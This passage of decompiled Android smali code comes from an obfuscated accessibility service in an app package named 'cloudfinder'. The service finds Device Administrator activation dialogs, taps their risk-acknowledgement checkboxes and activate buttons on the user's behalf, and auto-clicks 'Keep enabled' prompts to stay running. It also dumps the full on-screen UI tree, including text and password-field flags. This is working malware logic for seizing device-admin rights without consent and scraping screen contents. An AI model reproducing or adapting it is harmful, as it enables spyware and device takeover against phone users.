    if-eqz v0, :cond_5

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_1
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_5

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityWindowInfo;

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityWindowInfo;->getRoot()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-nez v3, :cond_2

    goto :goto_0

    :cond_2
    sget-object v4, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؾ:[Ljava/lang/String;

    array-length v5, v4

    move v6, v1

    :goto_1
    if-ge v6, v5, :cond_4

    aget-object v7, v4, v6

    invoke-virtual {v3, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-eqz v7, :cond_3

    invoke-interface {v7}, Ljava/util/List;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_3

    move-object v2, v3

    goto :goto_2

    :cond_3
    add-int/lit8 v6, v6, 0x1

    goto :goto_1

    :cond_4
    :goto_2
    if-eqz v2, :cond_1

    :cond_5
    if-nez v2, :cond_9

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_6

    return-void

    :cond_6
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؾ:[Ljava/lang/String;

    array-length v3, v0

    move v4, v1

    :goto_3
    if-ge v4, v3, :cond_8

    aget-object v5, v0, v4

    invoke-virtual {v2, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    if-eqz v5, :cond_7

    invoke-interface {v5}, Ljava/util/List;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_7

    const/4 v0, 0x1

    goto :goto_4

    :cond_7
    add-int/lit8 v4, v4, 0x1

    goto :goto_3

    :cond_8
    move v0, v1

    :goto_4
    if-nez v0, :cond_9

    return-void

    :cond_9
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "AutoClick: DeviceAdmin dialog detected pkg="

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string v0, "MyAccessSvc"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string p1, "I understand"

    const-string v3, "I acknowledge"

    const-string v4, "\u6211\u5df2\u77e5\u6653"

    const-string v5, "\u6211\u5df2\u4e86\u89e3"

    const-string v6, "I accept"

    filled-new-array {v4, p1, v3, v5, v6}, [Ljava/lang/String;

    move-result-object p1

    move v3, v1

    :goto_5
    const/4 v4, 0x5

    if-ge v3, v4, :cond_e

    aget-object v4, p1, v3

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    if-eqz v5, :cond_d

    invoke-interface {v5}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_a
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_d

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v7

    if-nez v7, :cond_c

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v7

    if-nez v7, :cond_b

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v7

    if-eqz v7, :cond_c

    :cond_b
    const/16 v5, 0x10

    invoke-virtual {v6, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "AutoClick: DA checked risk checkbox: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    goto :goto_6

    :cond_c
    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v7

    if-nez v7, :cond_a

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v7

    if-nez v7, :cond_a

    new-instance v7, Landroid/graphics/Rect;

    invoke-direct {v7}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v7}, Landroid/graphics/Rect;->width()I

    move-result v6

    if-lez v6, :cond_a

    iget v5, v7, Landroid/graphics/Rect;->left:I

    add-int/lit8 v5, v5, 0x14

    invoke-virtual {v7}, Landroid/graphics/Rect;->centerY()I

    move-result v6

    invoke-virtual {p0, v5, v6}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "AutoClick: DA tapped checkbox area: "

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    :goto_6
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_d
    add-int/lit8 v3, v3, 0x1

    goto :goto_5

    :cond_e
    const-string p1, "com.android.settings:id/action_button"

    const-string v3, "android:id/button1"

    const-string v4, "com.android.settings:id/activate_button"

    const-string v5, "android:id/button2"

    filled-new-array {p1, v3, v4, v5}, [Ljava/lang/String;

    move-result-object p1

    move v3, v1

    :goto_7
    const/4 v4, 0x4

    const-string v5, ")"

    const-string v6, ","

    if-ge v3, v4, :cond_10

    aget-object v4, p1, v3

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-eqz v7, :cond_f

    invoke-interface {v7}, Ljava/util/List;->isEmpty()Z

    move-result v8

    if-nez v8, :cond_f

    new-instance v8, Landroid/graphics/Rect;

    invoke-direct {v8}, Landroid/graphics/Rect;-><init>()V

    invoke-interface {v7, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v7, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v8}, Landroid/graphics/Rect;->width()I

    move-result v7

    if-lez v7, :cond_f

    invoke-virtual {v8}, Landroid/graphics/Rect;->height()I

    move-result v7

    if-lez v7, :cond_f

    const-string p1, "AutoClick: DA tap id="

    const-string v1, " at ("

    invoke-static {p1, v4, v1}, Landroidx/activity/result/؋;->ث(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {v8}, Landroid/graphics/Rect;->centerX()I

    move-result v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Landroid/graphics/Rect;->centerY()I

    move-result v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v8}, Landroid/graphics/Rect;->centerX()I

    move-result p1

    invoke-virtual {v8}, Landroid/graphics/Rect;->centerY()I

    move-result v0

    goto/16 :goto_9

    :cond_f
    add-int/lit8 v3, v3, 0x1

    goto :goto_7

    :cond_10
    sget-object p1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؿ:[Ljava/lang/String;

    array-length v3, p1

    :goto_8
    if-ge v1, v3, :cond_14

    aget-object v4, p1, v1

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v7

    if-eqz v7, :cond_13

    invoke-interface {v7}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v7

    :cond_11
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    move-result v8

    if-eqz v8, :cond_13

    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v9

    if-nez v9, :cond_12

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v9

    if-eqz v9, :cond_11

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    const-string v10, "Button"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_11

    :cond_12
    new-instance v9, Landroid/graphics/Rect;

    invoke-direct {v9}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v8, v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v9}, Landroid/graphics/Rect;->width()I

    move-result v8

    if-lez v8, :cond_11

    invoke-virtual {v9}, Landroid/graphics/Rect;->height()I

    move-result v8

    if-lez v8, :cond_11

    const-string p1, "AutoClick: DA tap text=\'"

    const-string v1, "\' at ("

    invoke-static {p1, v4, v1}, Landroidx/activity/result/؋;->ث(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {v9}, Landroid/graphics/Rect;->centerX()I

    move-result v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Landroid/graphics/Rect;->centerY()I

    move-result v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v9}, Landroid/graphics/Rect;->centerX()I

    move-result p1

    invoke-virtual {v9}, Landroid/graphics/Rect;->centerY()I

    move-result v0

    :goto_9
    invoke-virtual {p0, p1, v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    return-void

    :cond_13
    add-int/lit8 v1, v1, 0x1

    goto :goto_8

    :cond_14
    return-void
.end method

.method public final ؠ()V
    .locals 10

    sget-boolean v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ز:Z

    if-eqz v0, :cond_0

    return-void

    :cond_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    const-string v1, "Keep on"

    const-string v2, "Keep using"

    const-string v3, "\u4fdd\u6301\u5f00\u542f\u72b6\u6001"

    const-string v4, "\u4fdd\u6301\u5f00\u542f"

    const-string v5, "Keep enabled"

    filled-new-array {v3, v4, v5, v1, v2}, [Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    :goto_0
    const/4 v3, 0x5

    if-ge v2, v3, :cond_6

    aget-object v3, v1, v2

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v4

    if-eqz v4, :cond_5

    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_2
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_5

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v6, 0x10

    const-string v7, "\'"

    const-string v8, "MyAccessSvc"

    if-eqz v5, :cond_3

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v9

    if-eqz v9, :cond_3

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "AutoClick: keep-enabled \'"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    :goto_1
    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v5, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    return-void

    :cond_3
    if-eqz v5, :cond_4

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    goto :goto_2

    :cond_4
    const/4 v5, 0x0

    :goto_2
    if-eqz v5, :cond_2

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v9

    if-eqz v9, :cond_2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "AutoClick: keep-enabled parent \'"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    goto :goto_1

    :cond_5
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_6
    return-void
.end method

.method public final ء(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/StringBuilder;IILandroid/graphics/Rect;)V
    .locals 10

    const-string v0, ","

    const-string v1, "\""

    const/16 v2, 0x28

    if-le p3, v2, :cond_0

    goto/16 :goto_2

    :cond_0
    iget v2, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ئ:I

    const/16 v3, 0x1388

    if-lt v2, v3, :cond_1

    return-void

    :cond_1
    iget v2, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ئ:I

    add-int/lit8 v2, v2, 0x1

    iput v2, p0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ئ:I

    :try_start_0
    new-instance v2, Landroid/graphics/Rect;

    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v2, p5}, Landroid/graphics/Rect;->intersect(Landroid/graphics/Rect;)Z

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    const-string v4, "<node"

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " index=\""

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " depth=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " drawing-order=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getDrawingOrder()I

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " text=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p4

    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p4

    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " clz=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object p4

    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p4

    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " pkg=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p4

    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p4

    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " desc=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object p4

    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->و(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p4

    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " id=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p4

    if-eqz p4, :cond_2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p4

    goto :goto_0

    :cond_2
    const-string p4, ""

    :goto_0
    invoke-static {p4}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->د(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " checkable=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " checked=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " clickable=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " enabled=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEnabled()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " focusable=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocusable()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " focused=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isFocused()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " scrollable=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " long-clickable=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isLongClickable()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " password=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isPassword()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " selected=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isSelected()Z

    move-result p4

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " bounds=\"["

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p4, v2, Landroid/graphics/Rect;->left:I

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p4, v2, Landroid/graphics/Rect;->top:I

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p4, "]["

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p4, v2, Landroid/graphics/Rect;->right:I

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p4, v2, Landroid/graphics/Rect;->bottom:I

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p4, "]\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " left=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p4, v2, Landroid/graphics/Rect;->left:I

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " top=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p4, v2, Landroid/graphics/Rect;->top:I

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " right=\""

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p4, v2, Landroid/graphics/Rect;->right:I

    invoke-virtual {p2, p4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p4, " bottom=\""

